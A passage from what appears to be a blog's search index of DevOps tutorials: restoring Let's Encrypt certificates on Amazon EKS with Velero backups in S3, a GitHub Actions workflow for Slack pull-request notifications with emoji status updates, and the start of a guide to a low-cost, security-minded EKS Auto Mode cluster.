PublicAccessBlockConfiguration: BlockPublicAcls: true BlockPublicPolicy: true IgnorePublicAcls: true RestrictPublicBuckets: true LifecycleConfiguration: Rules: # Transitions objects to the ONEZONE_IA storage class after 30 days - Id: TransitionToOneZoneIA Status: Enabled Transitions: - TransitionInDays: 30 StorageClass: STANDARD_IA - Id: DeleteOldObjects Status: Enabled ExpirationInDays: 120 BucketEncryption: ServerSideEncryptionConfiguration: - ServerSideEncryptionByDefault: SSEAlgorithm: aws:kms KMSMasterKeyID: alias/aws/s3 S3BucketPolicy: Type: AWS::S3::BucketPolicy Properties: Bucket: !Ref S3Bucket PolicyDocument: Version: \"2012-10-17\" Statement: # S3 Bucket policy force HTTPs requests - Sid: ForceSSLOnlyAccess Effect: Deny Principal: \"*\" Action: s3:* Resource: - !GetAtt S3Bucket.Arn - !Sub ${S3Bucket.Arn}/* Condition: Bool: aws:SecureTransport: \"false\" S3Policy: Type: AWS::IAM::ManagedPolicy Properties: ManagedPolicyName: !Sub \"${S3BucketName}-s3\" Description: !Sub \"Policy required by Velero to write to S3 bucket ${S3BucketName}\" PolicyDocument: Version: \"2012-10-17\" Statement: - Effect: Allow Action: - s3:ListBucket - s3:GetBucketLocation - s3:ListBucketMultipartUploads Resource: !GetAtt S3Bucket.Arn - Effect: Allow Action: - s3:PutObject - s3:GetObject - s3:DeleteObject - s3:ListMultipartUploadParts - s3:AbortMultipartUpload Resource: !Sub \"arn:aws:s3:::${S3BucketName}/*\" # S3 Bucket policy does not deny HTTP requests - Sid: ForceSSLOnlyAccess Effect: Deny Action: \"s3:*\" Resource: - !Sub \"arn:${AWS::Partition}:s3:::${S3Bucket}\" - !Sub \"arn:${AWS::Partition}:s3:::${S3Bucket}/*\" Condition: Bool: aws:SecureTransport: \"false\" Outputs: S3PolicyArn: Description: The ARN of the created Amazon S3 policy Value: !Ref S3Policy S3Bucket: Description: The name of the created Amazon S3 bucket Value: !Ref S3Bucket EOF eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides S3BucketName=\"${CLUSTER_FQDN}\" EmailToSubscribe=\"${MY_EMAIL}\" \\ --stack-name \"${CLUSTER_NAME}-s3\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-s3.yml\" --tags \"${TAGS//,/ }\" fi Install Velero Before installing Velero, you must create a Pod Identity Association to grant Velero the necessary permissions to access S3 and EC2 resources. The created velero ServiceAccount will be specified in the Velero Helm chart later. tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}-iam-podidentityassociations.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} iam: podIdentityAssociations: - namespace: velero serviceAccountName: velero roleName: eksctl-${CLUSTER_NAME}-pia-velero permissionPolicy: Version: \"2012-10-17\" Statement: - Effect: Allow Action: [ \"ec2:DescribeVolumes\", \"ec2:DescribeSnapshots\", \"ec2:CreateTags\", \"ec2:CreateSnapshot\", \"ec2:DeleteSnapshots\" ] Resource: - \"*\" - Effect: Allow Action: [ \"s3:GetObject\", \"s3:DeleteObject\", \"s3:PutObject\", \"s3:PutObjectTagging\", \"s3:AbortMultipartUpload\", \"s3:ListMultipartUploadParts\" ] Resource: - \"arn:aws:s3:::${CLUSTER_FQDN}/*\" - Effect: Allow Action: [ \"s3:ListBucket\", ] Resource: - \"arn:aws:s3:::${CLUSTER_FQDN}\" EOF eksctl create podidentityassociation --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}-iam-podidentityassociations.yml\" 2025-02-06 06:13:57 [ℹ] 1 task: { 2 sequential sub-tasks: { create IAM role for pod identity association for service account \"velero/velero\", create pod identity association for service account \"velero/velero\", } }2025-02-06 06:13:58 [ℹ] deploying stack \"eksctl-k01-podidentityrole-velero-velero\" 2025-02-06 06:13:58 [ℹ] waiting for CloudFormation stack \"eksctl-k01-podidentityrole-velero-velero\" 2025-02-06 06:14:28 [ℹ] waiting for CloudFormation stack \"eksctl-k01-podidentityrole-velero-velero\" 2025-02-06 06:15:26 [ℹ] waiting for CloudFormation stack \"eksctl-k01-podidentityrole-velero-velero\" 2025-02-06 06:15:27 [ℹ] created pod identity association for service account \"velero\" in namespace \"velero\" 2025-02-06 06:15:27 [ℹ] all tasks were completed successfully Install the velero Helm chart and modify its default values: # renovate: datasource=helm depName=velero registryUrl=https://vmware-tanzu.github.io/helm-charts VELERO_HELM_CHART_VERSION=\"11.1.1\" helm repo add --force-update vmware-tanzu https://vmware-tanzu.github.io/helm-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" &lt;&lt; EOF initContainers: - name: velero-plugin-for-aws # renovate: datasource=docker depName=velero/velero-plugin-for-aws extractVersion=^(?&lt;version&gt;.+)$ image: velero/velero-plugin-for-aws:v1.13.0 volumeMounts: - mountPath: /target name: plugins metrics: serviceMonitor: enabled: true prometheusRule: enabled: true spec: - alert: VeleroBackupPartialFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} partially failed backups. expr: velero_backup_partial_failure_total{schedule!=\"\"} / velero_backup_attempt_total{schedule!=\"\"} &gt; 0.25 for: 15m labels: severity: warning - alert: VeleroBackupFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed backups. expr: velero_backup_failure_total{schedule!=\"\"} / velero_backup_attempt_total{schedule!=\"\"} &gt; 0.25 for: 15m labels: severity: warning - alert: VeleroBackupSnapshotFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed snapshot backups. expr: increase(velero_volume_snapshot_failure_total{schedule!=\"\"}[1h]) &gt; 0 for: 15m labels: severity: warning - alert: VeleroRestorePartialFailures annotations: message: Velero restore {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} partially failed restores. expr: increase(velero_restore_partial_failure_total{schedule!=\"\"}[1h]) &gt; 0 for: 15m labels: severity: warning - alert: VeleroRestoreFailures annotations: message: Velero restore {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed restores. expr: increase(velero_restore_failure_total{schedule!=\"\"}[1h]) &gt; 0 for: 15m labels: severity: warning configuration: backupStorageLocation: - name: provider: aws bucket: ${CLUSTER_FQDN} prefix: velero config: region: ${AWS_DEFAULT_REGION} volumeSnapshotLocation: - name: provider: aws config: region: ${AWS_DEFAULT_REGION} serviceAccount: server: name: velero credentials: useSecret: false # Create scheduled backup to periodically backup the let's encrypt production resources in the \"cert-manager\" namespace: schedules: monthly-backup-cert-manager-production: labels: letsencrypt: production schedule: \"@monthly\" template: ttl: 2160h includeClusterResources: true includedNamespaces: - cert-manager includedResources: - certificates.cert-manager.io - clusterissuers.cert-manager.io - secrets labelSelector: matchLabels: letsencrypt: production EOF helm upgrade --install --version \"${VELERO_HELM_CHART_VERSION}\" --namespace velero --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" velero vmware-tanzu/velero Add the Velero Grafana dashboard for enhanced monitoring and visualization: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"67.9.0\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-velero-cert-manager.yml\" &lt;&lt; EOF grafana: dashboards: default: 15469-kubernetes-addons-velero-stats: # renovate: depName=\"Velero Exporter Overview\" gnetId: 15469 revision: 1 datasource: Prometheus EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --reuse-values --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-velero-cert-manager.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack Backup cert-manager objects These steps should be done only once. Verify that the backup-location is set properly to AWS S3 and is available: velero get backup-location NAME PROVIDER BUCKET/PREFIX PHASE LAST VALIDATED ACCESS MODE DEFAULT default aws k01.k8s.mylabs.dev/velero Available 2025-02-06 06:21:59 +0100 CET ReadWrite true Initiate the backup process and store the required cert-manager objects in S3. if ! aws s3 ls \"s3://${CLUSTER_FQDN}/velero/backups/\" | grep -q velero-monthly-backup-cert-manager-production; then velero backup create --labels letsencrypt=production --ttl 2160h --from-schedule velero-monthly-backup-cert-manager-production --wait fi Check the backup details: velero backup describe --selector letsencrypt=production --details Name: velero-monthly-backup-cert-manager-production-20250206052506 Namespace: velero Labels: app.kubernetes.io/instance=velero app.kubernetes.io/managed-by=Helm app.kubernetes.io/name=velero helm.sh/chart=velero-8.3.0 letsencrypt=production velero.io/schedule-name=velero-monthly-backup-cert-manager-production velero.io/storage-location=default Annotations: meta.helm.sh/release-name=velero meta.helm.sh/release-namespace=velero velero.io/resource-timeout=10m0s velero.io/source-cluster-k8s-gitversion=v1.30.9-eks-8cce635 velero.io/source-cluster-k8s-major-version=1 velero.io/source-cluster-k8s-minor-version=30+ Phase: Completed Namespaces: Included: cert-manager Excluded: &lt;none&gt; Resources: Included: certificates.cert-manager.io, secrets Excluded: &lt;none&gt; Cluster-scoped: auto Label selector: letsencrypt=production Or label selector: &lt;none&gt; Storage Location: default Velero-Native Snapshot PVs: auto Snapshot Move Data: false Data Mover: velero TTL: 2160h0m0s CSISnapshotTimeout: 10m0s ItemOperationTimeout: 4h0m0s Hooks: &lt;none&gt; Backup Format Version: 1.1.0 Started: 2025-02-06 06:25:06 +0100 CET Completed: 2025-02-06 06:25:08 +0100 CET Expiration: 2025-05-07 07:25:06 +0200 CEST Total items to be backed up: 6 Items backed up: 6 Resource List: apiextensions.k8s.io/v1/CustomResourceDefinition: - certificates.cert-manager.io - clusterissuers.cert-manager.io cert-manager.io/v1/Certificate: - cert-manager/ingress-cert-production cert-manager.io/v1/ClusterIssuer: - letsencrypt-production-dns v1/Secret: - cert-manager/ingress-cert-production - cert-manager/letsencrypt-production-dns Backup Volumes: Velero-Native Snapshots: &lt;none included&gt; CSI Snapshots: &lt;none included&gt; Pod Volume Backups: &lt;none included&gt; HooksAttempted: 0 HooksFailed: 0 List the files in the S3 bucket: aws s3 ls --recursive \"s3://${CLUSTER_FQDN}/velero/backups\" 2025-02-06 06:25:09 4276 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-backup.json 2025-02-06 06:25:08 29 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-csi-volumesnapshotclasses.json.gz 2025-02-06 06:25:08 29 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-csi-volumesnapshotcontents.json.gz 2025-02-06 06:25:08 29 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-csi-volumesnapshots.json.gz 2025-02-06 06:25:08 27 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-itemoperations.json.gz 2025-02-06 06:25:08 3049 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-logs.gz 2025-02-06 06:25:08 29 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-podvolumebackups.json.gz 2025-02-06 06:25:08 121 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-resource-list.json.gz 2025-02-06 06:25:08 49 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-results.gz 2025-02-06 06:25:08 27 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-volumeinfo.json.gz 2025-02-06 06:25:08 29 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506-volumesnapshots.json.gz 2025-02-06 06:25:08 8379 velero/backups/velero-monthly-backup-cert-manager-production-20250206052506/velero-monthly-backup-cert-manager-production-20250206052506.tar.gz Restore cert-manager objects The following steps will guide you through restoring a Let’s Encrypt production certificate, previously backed up by Velero to S3, onto a new cluster. Initiate the restore process for the cert-manager objects. velero restore create --from-schedule velero-monthly-backup-cert-manager-production --labels letsencrypt=production --wait --existing-resource-policy=update View details about the restore process: velero restore describe --selector letsencrypt=production --details Name: velero-monthly-backup-cert-manager-production-20250206055911 Namespace: velero Labels: letsencrypt=production Annotations: &lt;none&gt; Phase: Completed Total items to be restored: 6 Items restored: 6 Started: 2025-02-06 06:59:12 +0100 CET Completed: 2025-02-06 06:59:13 +0100 CET Backup: velero-monthly-backup-cert-manager-production-20250206052506 Namespaces: Included: all namespaces found in the backup Excluded: &lt;none&gt; Resources: Included: * Excluded: nodes, events, events.events.k8s.io, backups.velero.io, restores.velero.io, resticrepositories.velero.io, csinodes.storage.k8s.io, volumeattachments.storage.k8s.io, backuprepositories.velero.io Cluster-scoped: auto Namespace mappings: &lt;none&gt; Label selector: &lt;none&gt; Or label selector: &lt;none&gt; Restore PVs: auto CSI Snapshot Restores: &lt;none included&gt; Existing Resource Policy: update ItemOperationTimeout: 4h0m0s Preserve Service NodePorts: auto Uploader config: HooksAttempted: 0 HooksFailed: 0 Resource List: apiextensions.k8s.io/v1/CustomResourceDefinition: - certificates.cert-manager.io(updated) - clusterissuers.cert-manager.io(updated) cert-manager.io/v1/Certificate: - cert-manager/ingress-cert-production(created) cert-manager.io/v1/ClusterIssuer: - letsencrypt-production-dns(updated) v1/Secret: - cert-manager/ingress-cert-production(created) - cert-manager/letsencrypt-production-dns(updated) Verify that the certificate was restored properly: kubectl describe certificates -n cert-manager ingress-cert-production Name: ingress-cert-production Namespace: cert-manager Labels: letsencrypt=production velero.io/backup-name=velero-monthly-backup-cert-manager-production-20250206052506 velero.io/restore-name=velero-monthly-backup-cert-manager-production-20250206055911 Annotations: &lt;none&gt; API Version: cert-manager.io/v1 Kind: Certificate Metadata: Creation Timestamp: 2025-02-06T05:59:13Z Generation: 1 Resource Version: 7903 UID: a7adee5e-82b7-4849-aac6-aa33298a9268 Spec: Common Name: *.k01.k8s.mylabs.dev Dns Names: *.k01.k8s.mylabs.dev k01.k8s.mylabs.dev Issuer Ref: Kind: ClusterIssuer Name: letsencrypt-production-dns Secret Name: ingress-cert-production Secret Template: Labels: Letsencrypt: production Status: Conditions: Last Transition Time: 2025-02-06T05:59:13Z Message: Certificate is up to date and has not expired Observed Generation: 1 Reason: Ready Status: True Type: Ready Not After: 2025-05-07T04:13:10Z Not Before: 2025-02-06T04:13:11Z Renewal Time: 2025-04-07T04:13:10Z Events: &lt;none&gt; Reconfigure ingress-nginx The previous steps restored the Let’s Encrypt production certificate (cert-manager/ingress-cert-production). Now, let’s configure ingress-nginx to use this certificate. First, check the current “staging” certificate; this will be replaced by the production certificate: while ! curl -sk \"https://${CLUSTER_FQDN}\" &gt; /dev/null; do date sleep 5 done openssl s_client -connect \"${CLUSTER_FQDN}:443\" &lt; /dev/null depth=1 C=US, O=(STAGING) Let's Encrypt, CN=(STAGING) Wannabe Watercress R11 verify error:num=20:unable to get local issuer certificate verify return:1 depth=0 CN=*.k01.k8s.mylabs.dev verify return:1 --- Certificate chain 0 s:CN=*.k01.k8s.mylabs.dev i:C=US, O=(STAGING) Let's Encrypt, CN=(STAGING) Wannabe Watercress R11 a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Feb 6 04:56:23 2025 GMT; NotAfter: May 7 04:56:22 2025 GMT 1 s:C=US, O=(STAGING) Let's Encrypt, CN=(STAGING) Wannabe Watercress R11 i:C=US, O=(STAGING) Internet Security Research Group, CN=(STAGING) Pretend Pear X1 a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Mar 13 00:00:00 2024 GMT; NotAfter: Mar 12 23:59:59 2027 GMT --- Server certificate -----BEGIN CERTIFICATE----- ... ... ... -----END CERTIFICATE----- subject=CN=*.k01.k8s.mylabs.dev issuer=C=US, O=(STAGING) Let's Encrypt, CN=(STAGING) Wannabe Watercress R11 --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 3270 bytes and written 409 bytes Verification error: unable to get local issuer certificate --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Protocol: TLSv1.3 Server public key is 2048 bit This TLS version forbids renegotiation. Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 20 (unable to get local issuer certificate) --- DONE Configure ingress-nginx to use the production Let’s Encrypt certificate. # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.12.3\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx-production-certs.yml\" &lt;&lt; EOF controller: extraArgs: default-ssl-certificate: cert-manager/ingress-cert-production EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --reuse-values --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx-production-certs.yml\" ingress-nginx ingress-nginx/ingress-nginx The production certificate should now be active and in use. while ! curl -sk \"https://${CLUSTER_FQDN}\" &gt; /dev/null; do date sleep 5 done openssl s_client -connect \"${CLUSTER_FQDN}:443\" &lt; /dev/null depth=2 C=US, O=Internet Security Research Group, CN=ISRG Root X1 verify return:1 depth=1 C=US, O=Let's Encrypt, CN=R10 verify return:1 depth=0 CN=*.k01.k8s.mylabs.dev verify return:1 --- Certificate chain 0 s:CN=*.k01.k8s.mylabs.dev i:C=US, O=Let's Encrypt, CN=R10 a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Feb 6 04:13:11 2025 GMT; NotAfter: May 7 04:13:10 2025 GMT 1 s:C=US, O=Let's Encrypt, CN=R10 i:C=US, O=Internet Security Research Group, CN=ISRG Root X1 a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256 v:NotBefore: Mar 13 00:00:00 2024 GMT; NotAfter: Mar 12 23:59:59 2027 GMT --- Server certificate -----BEGIN CERTIFICATE----- ... ... ... -----END CERTIFICATE----- subject=CN=*.k01.k8s.mylabs.dev issuer=C=US, O=Let's Encrypt, CN=R10 --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 3149 bytes and written 409 bytes Verification: OK --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Protocol: TLSv1.3 Server public key is 2048 bit This TLS version forbids renegotiation. Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 0 (ok) --- DONE Here is the report from SSL Labs: Examine the certificate details: kubectl describe certificates -n cert-manager ingress-cert-production Name: ingress-cert-production Namespace: cert-manager Labels: letsencrypt=production velero.io/backup-name=velero-monthly-backup-cert-manager-production-20250206052506 velero.io/restore-name=velero-monthly-backup-cert-manager-production-20250206055911 Annotations: &lt;none&gt; API Version: cert-manager.io/v1 Kind: Certificate Metadata: Creation Timestamp: 2025-02-06T05:59:13Z Generation: 1 Resource Version: 7903 UID: a7adee5e-82b7-4849-aac6-aa33298a9268 Spec: Common Name: *.k01.k8s.mylabs.dev Dns Names: *.k01.k8s.mylabs.dev k01.k8s.mylabs.dev Issuer Ref: Kind: ClusterIssuer Name: letsencrypt-production-dns Secret Name: ingress-cert-production Secret Template: Labels: Letsencrypt: production Status: Conditions: Last Transition Time: 2025-02-06T05:59:13Z Message: Certificate is up to date and has not expired Observed Generation: 1 Reason: Ready Status: True Type: Ready Not After: 2025-05-07T04:13:10Z Not Before: 2025-02-06T04:13:11Z Renewal Time: 2025-04-07T04:13:10Z Events: &lt;none&gt; Clean-up Back up the certificate before deleting the cluster (in case it was renewed): if [[ \"$(kubectl get --raw /api/v1/namespaces/cert-manager/services/cert-manager:9402/proxy/metrics | awk '/certmanager_http_acme_client_request_count.*acme-v02\\.api.*finalize/ { print $2 }')\" -gt 0 ]] &amp;&amp; [[ -n \"$(velero get backups -o json | jq -e --arg today \"$(date +%Y-%m-%d)\" '.items[] | select(.status.startTimestamp | startswith($today))')\" ]]; then velero backup create --labels letsencrypt=production --ttl 2160h --from-schedule velero-monthly-backup-cert-manager-production fi Remove files from the ${TMP_DIR}/${CLUSTER_FQDN} directory: for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{aws-s3,eksctl-${CLUSTER_NAME}-iam-podidentityassociations,helm_values-{ingress-nginx-production-certs,kube-prometheus-stack-velero-cert-manager,velero},k8s-cert-manager-{clusterissuer,certificate}-production}.yml; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy … 😉" }, { "title": "Slack notification for GitHub Pull Requests with status updates", "url": "/posts/slack-notification-pull-request/", "categories": "DevOps", "tags": "github-actions", "date": "2025-01-26 00:00:00 +0100", "content": "When working on code and collaborating with teammates, setting up Slack notifications for new GitHub Pull Requests can be helpful. This is a widely recognized best practice, and many people use the slack-github-action to implement it. However, using Slack reactions for Pull Request updates is less common. Here’s a screencast demonstrating what the Slack notification with status updates looks like: In this article, I will walk you through setting up Slack notifications for GitHub Pull Requests, including status updates, using GitHub Actions. Requirements First, create GitHub Action secrets named MY_SLACK_BOT_TOKEN and MY_SLACK_CHANNEL_ID. Detailed instructions for this can be found in the slack-github-action repository. Next, create a new GitHub Action workflow file named .github/workflows/pr-slack-notification.yml with the following content. name: pr-slack-notification # Based on: https://github.com/slackapi/slack-github-action/issues/269 # Description: https://ruzickap.github.io/posts/slack-notification-pull-request/ on: workflow_dispatch: pull_request: types: - opened - ready_for_review - review_requested - closed issue_comment: types: - created pull_request_review: types: - submitted permissions: read-all defaults: run: shell: bash -euxo pipefail {0} jobs: debug: runs-on: ubuntu-latest steps: - name: Debug env: GITHUB_CONTEXT: ${{ toJson(github) }} run: | echo \"${GITHUB_CONTEXT}\" pr-slack-notification: runs-on: ubuntu-latest name: Sends a message to Slack when a PR is opened if: (github.event.action == 'opened' &amp;&amp; github.event.pull_request.draft == false) || github.event.action == 'ready_for_review' steps: - name: Post PR summary message to slack id: message uses: slackapi/slack-github-action@485a9d42d3a73031f12ec201c457e2162c45d02d # v2.0.0 with: method: chat.postMessage token: ${{ secrets.MY_SLACK_BOT_TOKEN }} payload: | channel: ${{ secrets.MY_SLACK_CHANNEL_ID }} text: \"💡 *${{ github.event.pull_request.user.login }}*: &lt;${{ github.event.pull_request.html_url }}|#${{ github.event.pull_request.number }} - ${{ github.event.pull_request.title }}&gt; (+${{ github.event.pull_request.additions }}, -${{ github.event.pull_request.deletions }})\" - name: Create file with slack message timestamp run: | echo \"${{ steps.message.outputs.ts }}\" &gt; slack-message-timestamp.txt - name: Cache slack message timestamp uses: actions/cache/save@1bd1e32a3bdc45362d1e726936510720a7c30a57 # v4.2.0 with: path: slack-message-timestamp.txt key: slack-message-timestamp-${{ github.event.pull_request.html_url }}-${{ steps.message.outputs.ts }} slack-emoji-react: runs-on: ubuntu-latest name: Adds emoji reaction to slack message when a PR is closed or reviewed if: ${{ startsWith(github.event.pull_request.html_url, 'https') || startsWith(github.event.issue.pull_request.html_url, 'https') }} steps: # gh commands needs to be executed in the repository - name: Checkout Code uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2 # https://stackoverflow.com/questions/74640750/github-actions-not-finding-cache # I can not use the cache action in this job because the cache is not shared between runs - name: Save slack timestamp as an environment variable id: slack-timestamp env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} run: | SLACK_TIMESTAMP=$(gh cache list --json key --jq '.[].key|capture(\"${{ github.event.pull_request.html_url || github.event.issue.pull_request.html_url }}-(?&lt;x&gt;.+)\").x') echo \"SLACK_TIMESTAMP=${SLACK_TIMESTAMP}\" | tee -a \"${GITHUB_ENV}\" if [[ \"${SLACK_TIMESTAMP}\" != '' ]]; then echo \"github_event_pull_request_html_url=true\" &gt;&gt; \"${GITHUB_OUTPUT}\" fi - name: Decide which emoji to add if: ${{ steps.slack-timestamp.outputs.github_event_pull_request_html_url == 'true' }} run: | case \"${{ github.event.action }}\" in created) if [[ \"${{ github.event_name }}\" == 'issue_comment' ]]; then echo \"EMOJI=speech_balloon\" &gt;&gt; \"${GITHUB_ENV}\" # 💬 fi ;; submitted) case \"${{ github.event.review.state }}\" in changes_requested) echo \"EMOJI=repeat\" &gt;&gt; \"${GITHUB_ENV}\" # 🔁 ;; approved) echo \"EMOJI=ok\" &gt;&gt; \"${GITHUB_ENV}\" # 🆗 ;; commented) echo \"EMOJI=speech_balloon\" &gt;&gt; \"${GITHUB_ENV}\" # 💬 ;; esac ;; review_requested) echo \"EMOJI=eyes\" &gt;&gt; \"${GITHUB_ENV}\" # 👀 ;; *) echo \"EMOJI=false\" &gt;&gt; \"${GITHUB_ENV}\" ;; esac - name: React to PR summary message in slack with emoji if: ${{ steps.slack-timestamp.outputs.github_event_pull_request_html_url == 'true' &amp;&amp; env.EMOJI != 'false' }} uses: slackapi/slack-github-action@485a9d42d3a73031f12ec201c457e2162c45d02d # v2.0.0 with: method: reactions.add token: ${{ secrets.MY_SLACK_BOT_TOKEN }} payload: | channel: ${{ secrets.MY_SLACK_CHANNEL_ID }} timestamp: \"${{ env.SLACK_TIMESTAMP }}\" name: ${{ env.EMOJI }} - name: Update the original message with success if: ${{ github.event.pull_request.merged &amp;&amp; steps.slack-timestamp.outputs.github_event_pull_request_html_url == 'true' }} uses: slackapi/slack-github-action@v2.0.0 with: method: chat.update token: ${{ secrets.MY_SLACK_BOT_TOKEN }} payload: | channel: ${{ secrets.MY_SLACK_CHANNEL_ID }} ts: \"${{ env.SLACK_TIMESTAMP }}\" text: \"✅ *${{ github.event.pull_request.user.login }}*: &lt;${{ github.event.pull_request.html_url }}|#${{ github.event.pull_request.number }} - ${{ github.event.pull_request.title }}&gt; (+${{ github.event.pull_request.additions }}, -${{ github.event.pull_request.deletions }})\" attachments: - color: \"28a745\" fields: - title: \"Status\" short: true value: \"Merged ✅\" Description The workflow file defines two jobs: pr-slack-notification and slack-emoji-react. The pr-slack-notification job sends a message to Slack when a Pull Request is opened or marked as ready for review. The slack-emoji-react job adds an emoji reaction to the Slack message when a Pull Request is closed or reviewed. This job also updates the original message with a success indicator when the Pull Request is merged. The Slack message “emoji” updates cover the following scenarios: 💬 - a new comment is added to the pull request through either a “Pull Request Comment” or a “Review Changes Comment” 🔁 - the reviewer has requested changes 🆗 - the reviewer has approved the Pull Request 👀 - The Pull Request owner has requested the reviewer to review the Pull Request ✅ - The Pull Request has been merged The screencast above showcases some of these actions. The GitHub Action workflow code and its description may change in the future. The latest version of the code can be found here: pr-slack-notification.yml Enjoy … 😉" }, { "title": "Build secure and cheap Amazon EKS Auto Mode", "url": "/posts/secure-cheap-amazon-eks-auto/", "categories": "Kubernetes, Cloud, Security", "tags": "amazon-eks, eks-auto-mode, kubernetes, security, eksctl, cert-manager, external-dns, prometheus, sso", "date": "2024-12-14 00:00:00 +0100", "content": "I will outline the steps for setting up an Amazon EKS Auto Mode environment that is both cost-effective and prioritizes security, including the configuration of standard applications. The Amazon EKS Auto Mode setup should align with the following cost-effectiveness criteria: Utilize two Availability Zones (AZs), or a single zone if possible, to reduce payments for cross-AZ traffic Spot instances Less expensive region - us-east-1 Most price efficient EC2 instance type t4g.medium (2 x CPU, 4GB RAM) using AWS Graviton based on ARM Use Bottlerocket OS for a minimal operating system, CPU, and memory footprint Use Network Load Balancer (NLB) as a most cost efficient + cost optimized load balancer Karpenter to enable automatic node scaling that matches the specific resource requirements of pods The Amazon EKS Auto Mode setup should also meet the following security requirements: The Amazon EKS Auto Mode control plane must be encrypted using KMS Worker node EBS volumes must be encrypted Cluster logging to CloudWatch must be configured Build Amazon EKS Auto Mode Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables. # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you plan to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" export AWS_PARTITION=\"aws\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export 